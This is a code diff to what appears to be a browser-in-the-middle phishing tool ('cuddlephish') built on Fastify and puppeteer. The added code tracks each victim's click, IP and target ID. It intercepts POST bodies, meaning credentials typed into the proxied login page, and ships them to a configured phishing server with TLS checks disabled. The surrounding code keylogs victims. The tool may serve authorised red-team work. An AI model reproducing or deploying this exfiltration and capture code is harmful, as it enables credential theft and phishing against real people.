@@ -1,6 +1,7 @@
 import fs from 'fs'
 import path from 'path'
 const __dirname = path.resolve()
+import got from 'got'
 import Fastify from 'fastify'
 import fastify_io from 'fastify-socket.io'
 import puppeteer from 'puppeteer-extra'
@@ -26,6 +27,34 @@ try{
   fs.mkdirSync('./user_data')
 }catch(err){
   //must exist already. We do it this way to avoid a race condition of checking the existence of the dir before trying to write to it
+}
+
+//load pm config if it exists
+var pm = undefined
+try {
+  if (fs.existsSync('./pm.json')) {
+    pm= JSON.parse(fs.readFileSync('./pm.json', 'utf8'));
+  }
+} catch(err) {
+  //console.error(err)
+}
+
+var ship_logs = function(log_data){
+  var headers = { 
+    'Content-Type': 'application/json',
+    'Cookie': pm.admin_cookie
+  }   
+  //send logs off to our phishing server/logging endpoint
+  got.post(pm.logging_endpoint , { 
+    headers: headers,
+    https: {rejectUnauthorized: false},
+    json: log_data
+  }).catch(function(err){
+    console.log("Logging Endpoint Failed: " + pm.logging_endpoint)
+    console.log("Error:" + err)
+    //console.log("Error:" + err.response.body)
+    return
+  })  
 }
 
 const fastify = Fastify({
@@ -63,10 +92,15 @@ fastify.route({
   url: '/*',
   handler: async function (req, reply) {
     let client_ip = req.headers['x-real-ip']
+    let tracking_id = pm ? pm.tacking_id : 'tracking_id'
+    let target_id = req.query[tracking_id] ? req.query[tracking_id] : "unknown"
+    if(pm){
+      ship_logs({"event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url})
+    }
     console.log('client_ip: ' + client_ip)
     //if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
-      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)))
+      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)))
     //}else{
     //  reply.type('text/html').send("403")
     //}
@@ -161,6 +195,8 @@ async function get_browser(target_page){
   browser.victim_socket = ''
   browser.victim_width = 0
   browser.victim_height = 0
+  browser.victim_ip = ''
+  browser.victim_target_id = ''
   browser.controller_socket = ''
   browser.keylog = ''
   browser.keylog_file = fs.createWriteStream(`./user_data/${browser_id}/keylog.txt`, {flags:'a'});
@@ -171,6 +207,17 @@ async function get_browser(target_page){
   browser.target_page.on('dialog', async dialog => {
     console.log(dialog.message())
     await dialog.accept()
+  })
+  browser.target_page.on('request', async request => {
+    if(request.method() === 'POST'){
+      if(pm && browser.victim_ip != ''){
+        let post_url_search = new RegExp(`${pm.post_url_search}`, "i");
+        if(post_url_search.test(request.url())){
+          ship_logs({"event_ip": browser.victim_ip, "target": browser.victim_target_id, "event_type": "POST_DATA", "event_data": request.postData()})
+//          console.log(request.postData())
+        }
+      }
+    }
   })
   browser.remove_instance = async function(){
     xvfb.stop((err)=>{if (err) console.error(err)})
@@ -218,7 +265,9 @@ fastify.ready(async function(err){
         }
       })
     })
-    socket.on('new_phish', async function(viewport_width, viewport_height){
+    socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
+      empty_phishbowl.victim_ip = client_ip
+      empty_phishbowl.victim_target_id = target_id
       empty_phishbowl.victim_width = viewport_width
       empty_phishbowl.victim_height = viewport_height
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
